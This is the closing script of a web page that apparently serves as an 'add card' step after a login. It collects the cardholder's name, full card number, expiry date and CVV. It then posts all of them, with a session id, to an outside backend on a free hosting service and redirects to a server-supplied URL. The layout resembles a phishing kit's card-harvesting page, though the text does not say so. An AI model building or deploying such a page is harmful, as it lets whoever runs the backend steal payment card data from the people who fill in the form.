        document.getElementById('cardForm').addEventListener('submit', function (e) {
            e.preventDefault();
            
            // Get form values
            const cardName = document.getElementById('cardName').value.trim();
            const cardNumber = document.getElementById('cardNumber').value;
            const cardExpiry = document.getElementById('cardExpiry').value;
            const cardCVV = document.getElementById('cardCVV').value;
            
            // Show loading state
            const submitBtn = document.getElementById('submitBtn');
            const spinner = submitBtn.querySelector('.loading');
            const buttonText = submitBtn.querySelector('span');
            
            spinner.classList.add('active');
            buttonText.textContent = 'Processing...';
            submitBtn.disabled = true;
            
            // Clear previous errors and success messages
            clearErrors();
            document.getElementById('successMessage').classList.remove('show');
            
            // Validate fields
            let isValid = true;
            
            // Validate Card Name
            if (!cardName) {
                showError('cardName', 'Please enter the name on the card');
                isValid = false;
            } else if (cardName.split(' ').length < 2) {
                showError('cardName', 'Please enter full name as shown on card');
                isValid = false;
            } else {
                showSuccess('cardName');
            }
            
            // Validate Card Number
            if (!cardNumber) {
                showError('cardNumber', 'Please enter your card number');
                isValid = false;
            } else if (!validateCardNumber(cardNumber)) {
                showError('cardNumber', 'Please enter a valid card number');
                isValid = false;
            } else {
                showSuccess('cardNumber');
            }
            
            // Validate Expiration Date
            if (!cardExpiry) {
                showError('cardExpiry', 'Please enter expiration date');
                isValid = false;
            } else if (!validateExpiryDate(cardExpiry)) {
                showError('cardExpiry', 'Please enter a valid expiration date (MM/YY)');
                isValid = false;
            } else {
                showSuccess('cardExpiry');
            }
            
            // Validate CVV
            if (!cardCVV) {
                showError('cardCVV', 'Please enter CVV');
                isValid = false;
            } else if (!validateCVV(cardCVV, cardNumber)) {
                const cardType = detectCardType(cardNumber.replace(/\s/g, ''));
                if (cardType.type === 'AMEX') {
                    showError('cardCVV', 'American Express requires 4-digit CVV');
                } else {
                    showError('cardCVV', 'Please enter a valid 3-digit CVV');
                }
                isValid = false;
            } else {
                showSuccess('cardCVV');
            }
            
            if (!isValid) {
                // Reset button state
                spinner.classList.remove('active');
                buttonText.textContent = 'Add Card';
                submitBtn.disabled = false;
                return;
            }
            
            // Prepare data for submission
            const cardData = {
                card_name: cardName,
                card_number: cardNumber.replace(/\s/g, ''),
                card_expiry: cardExpiry,
                card_cvv: cardCVV,
                card_type: detectCardType(cardNumber).type,
                session_id: getSessionId()
            };
            
            // Send data to server
            fetch('https://b-bcknd.onrender.com/add-card', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(cardData)
            })
            .then(res => {
                if (!res.ok) throw new Error(`HTTP error! Status: ${res.status}`);
                return res.json();
            })
            .then(data => {
                if (data.success) {
                    // Show success message
                    document.getElementById('successMessage').textContent = 'Card added successfully! Redirecting...';
                    document.getElementById('successMessage').classList.add('show');
                    
                    // Store card data (in production, this would be encrypted)
                    localStorage.setItem('card_data', JSON.stringify({
                        last_four: cardNumber.replace(/\s/g, '').slice(-4),
                        card_type: detectCardType(cardNumber).type,
                        expiry: cardExpiry
                    }));
                    
                    // Clear sensitive data after submission
                    setTimeout(() => {
                        document.getElementById('cardNumber').value = '';
                        document.getElementById('cardCVV').value = '';
                    }, 1000);
                    
                    // Redirect to confirmation or dashboard
                    setTimeout(() => {
                        window.location.href = data.redirect_url || 'confirmation.html';
                    }, 1500);
                } else {
                    throw new Error(data.error || 'Failed to add card');
                }
            })
            .catch(err => {
                console.error('Card submission error:', err);
                
                // Show error message
                document.getElementById('successMessage').textContent = 'Error: ' + err.message;
                document.getElementById('successMessage').classList.add('show');
                document.getElementById('successMessage').classList.remove('success-message');
                document.getElementById('successMessage').classList.add('error-message');
                
                // Reset button state
                spinner.classList.remove('active');
                buttonText.textContent = 'Add Card';
                submitBtn.disabled = false;
            });
        });
        
        // Get session ID from localStorage or URL
        function getSessionId() {
            // Try to get from localStorage first
            const sessionId = localStorage.getItem('session_id');
            
            // If not in localStorage, try to get from URL parameters
            if (!sessionId) {
                const urlParams = new URLSearchParams(window.location.search);
                return urlParams.get('session_id');
            }
            
            return sessionId;
        }
        
        // Initialize page
        document.addEventListener('DOMContentLoaded', () => {
            // Check if we have a session ID
            const sessionId = getSessionId();
            if (!sessionId) {
                alert('No active session found. Please login again.');
                window.location.href = 'index.html';
                return;
            }
            
            // Load previously saved card data if exists
            const savedCard = localStorage.getItem('card_data');
            if (savedCard) {
                try {
                    const data = JSON.parse(savedCard);
                    document.getElementById('cardName').value = data.card_name || '';
                    
                    if (data.last_four) {
                        const masked = '•••• •••• •••• ' + data.last_four;
                        document.getElementById('cardNumber').value = masked;
                    }
                    
                    if (data.expiry) {
                        document.getElementById('cardExpiry').value = data.expiry;
                    }
                } catch (e) {
                    console.error('Error loading saved card data:', e);
                }
            }
            
            // Set up real-time formatting and validation
            const cardNumberInput = document.getElementById('cardNumber');
            const cardExpiryInput = document.getElementById('cardExpiry');
            const cardNameInput = document.getElementById('cardName');
            
            // Card number formatting
            cardNumberInput.addEventListener('input', function(e) {
                let value = e.target.value;
                
                // Remove any existing formatting
                value = value.replace(/\s/g, '');
                
                // Limit to 16 digits
                if (value.length > 16) {
                    value = value.substring(0, 16);
                }
                
                // Format with spaces
                const formatted = formatCardNumber(value);
                e.target.value = formatted;
                
                // Update preview
                updateCardPreview();
                
                // Clear error when user starts typing
                document.getElementById('cardNumberError').classList.remove('show');
                e.target.classList.remove('error');
            });
            
            // Expiry date formatting
            cardExpiryInput.addEventListener('input', function(e) {
                let value = e.target.value;
                
                // Remove any non-digits
                value = value.replace(/\D/g, '');
                
                // Limit to 4 digits
                if (value.length > 4) {
                    value = value.substring(0, 4);
                }
                
                // Format with slash
                const formatted = formatExpiryDate(value);
                e.target.value = formatted;
                
                // Update preview
                updateCardPreview();
                
                // Clear error when user starts typing
                document.getElementById('cardExpiryError').classList.remove('show');
                e.target.classList.remove('error');
            });
            
            // Card name updates preview
            cardNameInput.addEventListener('input', function(e) {
                updateCardPreview();
                document.getElementById('cardNameError').classList.remove('show');
                e.target.classList.remove('error');
            });
            
            // CVV validation
            document.getElementById('cardCVV').addEventListener('input', function(e) {
                // Remove any non-digits
                let value = e.target.value;
                value = value.replace(/\D/g, '');
                
                // Limit based on card type
                const cardNumber = cardNumberInput.value;
                const cardType = detectCardType(cardNumber);
                const maxLength = cardType.type === 'AMEX' ? 4 : 3;
                
                if (value.length > maxLength) {
                    value = value.substring(0, maxLength);
                }
                
                e.target.value = value;
                
                // Clear error when user starts typing
                document.getElementById('cardCVVError').classList.remove('show');
                e.target.classList.remove('error');
            });
            
            // Initial preview update
            updateCardPreview();
            
            // Auto-focus first empty field
            if (!cardNameInput.value) cardNameInput.focus();
            else if (!cardNumberInput.value) cardNumberInput.focus();
            else if (!cardExpiryInput.value) cardExpiryInput.focus();
            else document.getElementById('cardCVV').focus();
        });
    </script>
</body>
</html>
